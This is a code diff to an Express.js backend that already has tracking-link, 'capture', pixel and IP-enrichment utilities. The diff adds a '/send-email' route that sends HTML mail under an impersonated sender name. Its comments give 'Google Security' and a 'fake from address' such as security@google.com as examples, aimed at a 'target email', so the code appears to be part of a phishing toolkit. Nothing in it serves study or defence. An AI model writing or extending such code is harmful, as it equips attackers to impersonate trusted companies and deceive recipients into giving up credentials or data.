@@ -2,6 +2,7 @@ import express from "express";
 import axios from "axios";
 import { createTrackingLink, recordCapture, addCredits, createPixel, recordPixelHit } from "../utils/linkService.js";
 import { db } from "../firebase/config.js";
+import nodemailer from "nodemailer";
 
 const router = express.Router();
 
@@ -101,6 +102,50 @@ async function enrichIP(ip) {
         };
     } catch { return {}; }
 }
+
+//email-sender
+router.post("/send-email", async(req, res) => {
+    try {
+        const {
+            fromName, // display name e.g. "Google Security"
+            fromEmail, // fake from address e.g. "security@google.com"
+            toEmail, // target email
+            subject,
+            htmlBody,
+        } = req.body;
+
+        if (!toEmail || !subject || !htmlBody) {
+            return res.status(400).json({ error: "toEmail, subject and htmlBody are required" });
+        }
+
+        const transporter = nodemailer.createTransport({
+            service: "gmail",
+            auth: {
+                user: process.env.SMTP_USER,
+                pass: process.env.SMTP_PASS,
+            },
+        });
+
+        const mailOptions = {
+            from: `"${fromName || "Security Team"}" <${process.env.SMTP_USER}>`,
+            replyTo: fromEmail || process.env.SMTP_USER,
+            to: toEmail,
+            subject: subject,
+            html: htmlBody,
+        };
+
+        const info = await transporter.sendMail(mailOptions);
+        console.log("[send-email] sent:", info.messageId);
+        return res.status(200).json({ success: true, messageId: info.messageId });
+
+    } catch (err) {
+        console.error("[send-email] ERROR:", err.message);
+        return res.status(500).json({ error: err.message });
+    }
+});
+
+
+
 
 // -- PIXEL ROUTES --------------------------------------------------------------
 
